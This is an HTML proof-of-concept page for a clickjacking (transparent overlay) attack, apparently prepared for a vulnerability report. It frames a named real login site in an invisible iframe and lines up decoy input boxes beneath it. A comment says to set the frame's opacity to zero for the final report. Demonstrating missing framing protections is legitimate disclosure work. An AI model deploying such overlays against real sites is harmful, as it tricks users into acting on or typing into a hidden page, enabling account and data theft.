<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC - Transparent Overlay</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #000; }

        /* LAYER 1: The REAL site (Invisible but active) */
        .victim-frame { 
            position: absolute;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            border: none;
            z-index: 2;
            /* Start at 0.3 to align the boxes, then change to 0.0 for the final report */
            opacity: 0.3; 
        }

        /* LAYER 2: The Clear "Trap" Inputs */
        .attacker-layer {
            position: absolute;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1;
        }

        .clear-input {
            width: 320px; /* Match width of Sentiyo inputs */
            height: 45px; /* Match height of Sentiyo inputs */
            margin: 10px 0;
            background: rgba(255, 255, 255, 0.9); /* High clarity white */
            border: 2px solid #ff9800; /* Orange border to show where the "trap" is */
            border-radius: 4px;
        }
    </style>
</head>
<body>

    <iframe src="https://aws.sentiyo.com" class="victim-frame"></iframe>

    <div class="attacker-layer">
        <div class="clear-input"></div> <div class="clear-input"></div> </div>

</body>
</html>
